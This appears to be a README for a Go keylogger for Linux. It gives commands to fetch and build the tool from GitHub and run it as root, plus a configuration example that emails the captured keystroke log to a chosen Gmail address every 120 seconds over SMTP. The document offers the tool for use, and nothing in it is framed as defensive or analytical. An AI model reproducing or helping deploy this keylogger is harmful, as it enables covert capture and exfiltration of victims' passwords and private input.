# gokeylogger for linux os 
```sh
# install
$ go get -v -d github.com/mehrati/gokeylogger
$ cd $GOPATH/src/github.com/mehrati/gokeylogger
```
```toml
# edit conf.toml with nano or vim or ...
# -----------------------conf.toml example------------------------------
cron_duration = "@every 120s" # send mail keylog file every 120 second
from_mail = "******@gmail.com" # address send email 
to_mail = "*******@gmail.com" # address recv email
user_mail = "*******@gmail.com" # user mail
subject_mail = "keylogger" # subject mail
host_mail = "smtp.gmail.com" # host mail
pass_mail = "*****" # password mail
port_mail = 587 # port mail
# ---------------------------------------------------------------------
```
```sh
$ go build
# run gokeylogger need root privilege
$ sudo ./gokeylogger
$ cat log
$ cat keylog
# kill gokeylogger
$ ./kill.sh
```